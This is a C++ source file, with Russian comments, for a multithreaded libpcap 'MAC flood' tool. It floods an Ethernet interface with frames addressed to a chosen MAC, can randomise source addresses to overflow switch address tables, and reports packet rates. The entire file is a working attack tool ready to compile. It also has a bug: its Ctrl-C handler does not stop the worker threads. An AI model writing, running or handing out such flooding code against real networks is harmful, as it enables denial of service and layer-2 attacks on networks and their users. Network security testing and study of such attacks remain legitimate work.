// g++ -O2 -pthread mac_flood.cpp -o mac_flood -lpcap -std=c++11
#include <pcap.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <signal.h>
#include <atomic>
#include <thread>
#include <chrono>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <random>
#include <vector>

std::atomic<bool> stop_flag(false);
std::vector<pcap_t*> g_handles;

void signal_handler(int) {
    stop_flag = true;
    // Прерываем все pcap-дескрипторы, если они в состоянии ожидания
    for (auto h : g_handles) {
        if (h) pcap_breakloop(h);
    }
}

#pragma pack(push, 1)
struct eth_frame {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t type;
    uint8_t  payload[46];
};
#pragma pack(pop)

bool get_if_mac(const char* ifname, uint8_t* mac) {
    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
    ifr.ifr_name[IFNAMSIZ-1] = '\0';
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        close(sock);
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    close(sock);
    return true;
}

void random_mac(uint8_t* mac) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(0, 255);
    uint8_t prefixes[] = {0x00, 0x9c, 0x8c, 0x2c, 0x4c, 0x6c, 0xa4, 0xb8, 0xd0};
    mac[0] = prefixes[dis(gen) % (sizeof(prefixes)/sizeof(prefixes[0]))];
    for (int i = 1; i < 6; ++i) mac[i] = dis(gen);
}

void send_mac_flood(pcap_t* handle, const uint8_t* dst_mac, bool random_src, uint8_t* real_src_mac) {
    eth_frame frame;
    memcpy(frame.dst, dst_mac, 6);
    if (random_src) {
        random_mac(frame.src);
    } else {
        memcpy(frame.src, real_src_mac, 6);
    }
    frame.type = htons(0x0800);
    memset(frame.payload, 0, 46);
    pcap_sendpacket(handle, (const u_char*)&frame, sizeof(frame));
}

void flood_worker(pcap_t* handle, const uint8_t* dst_mac, bool random_src, uint8_t* real_src_mac,
                  std::atomic<uint64_t>* counter, std::atomic<bool>* stop) {
    while (!stop->load(std::memory_order_relaxed)) {
        send_mac_flood(handle, dst_mac, random_src, real_src_mac);
        counter->fetch_add(1, std::memory_order_relaxed);
        // небольшая задержка для снижения нагрузки и реакции на stop
        if (stop->load(std::memory_order_relaxed)) break;
        std::this_thread::yield();
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <interface> <duration_sec> <dst_mac> [--random-mac]\n", argv[0]);
        return 1;
    }

    const char* iface = argv[1];
    int duration = atoi(argv[2]);
    uint8_t dst_mac[6];
    if (sscanf(argv[3], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &dst_mac[0], &dst_mac[1], &dst_mac[2],
               &dst_mac[3], &dst_mac[4], &dst_mac[5]) != 6) {
        fprintf(stderr, "Invalid MAC address\n");
        return 1;
    }

    bool random_src = false;
    for (int i = 4; i < argc; ++i) {
        if (strcmp(argv[i], "--random-mac") == 0) random_src = true;
    }

    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(iface, 65536, 1, 1000, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }
    if (pcap_datalink(handle) != DLT_EN10MB) {
        fprintf(stderr, "Interface not Ethernet\n");
        pcap_close(handle);
        return 1;
    }

    uint8_t real_src_mac[6];
    if (!random_src && !get_if_mac(iface, real_src_mac)) {
        fprintf(stderr, "Cannot get MAC\n");
        pcap_close(handle);
        return 1;
    }

    printf("MAC flood started on %s\n", iface);
    printf("Dest MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
           dst_mac[0], dst_mac[1], dst_mac[2],
           dst_mac[3], dst_mac[4], dst_mac[5]);
    printf("Random source MAC: %s\n", random_src ? "yes" : "no");
    printf("Duration: %d sec\n", duration);

    int threads = std::thread::hardware_concurrency();
    if (threads == 0) threads = 2;

    std::vector<pcap_t*> handles;
    for (int i = 0; i < threads; ++i) {
        pcap_t* h = pcap_open_live(iface, 65536, 1, 1000, errbuf);
        if (!h) {
            fprintf(stderr, "pcap_open_live for thread: %s\n", errbuf);
            break;
        }
        handles.push_back(h);
    }
    if (handles.empty()) {
        pcap_close(handle);
        return 1;
    }
    g_handles = handles; // сохраняем для обработчика сигнала

    std::atomic<uint64_t> total_packets(0);
    std::atomic<bool> stop(false);

    std::vector<std::thread> workers;
    auto start_time = std::chrono::steady_clock::now();

    for (size_t i = 0; i < handles.size(); ++i) {
        workers.emplace_back(flood_worker, handles[i], dst_mac, random_src, real_src_mac,
                             &total_packets, &stop);
    }

    if (duration > 0) {
        std::this_thread::sleep_for(std::chrono::seconds(duration));
        stop = true;
    } else {
        printf("Press Enter to stop...\n");
        getchar();
        stop = true;
    }

    // Ждём завершения потоков с таймаутом
    for (auto& t : workers) {
        if (t.joinable()) {
            t.join();
        }
    }

    for (auto h : handles) pcap_close(h);
    pcap_close(handle);

    auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now() - start_time).count();
    uint64_t pkts = total_packets.load();
    double pps = elapsed ? (pkts * 1000.0 / elapsed) : 0;
    double mbps = pps * 60 * 8 / 1e6;

    printf("\n--- FINAL STATS ---\n");
    printf("Total frames sent: %lu\n", pkts);
    printf("Duration: %ld ms\n", elapsed);
    printf("Throughput: %.0f fps\n", pps);
    printf("Bandwidth: %.2f Mbps\n", mbps);

    return 0;
}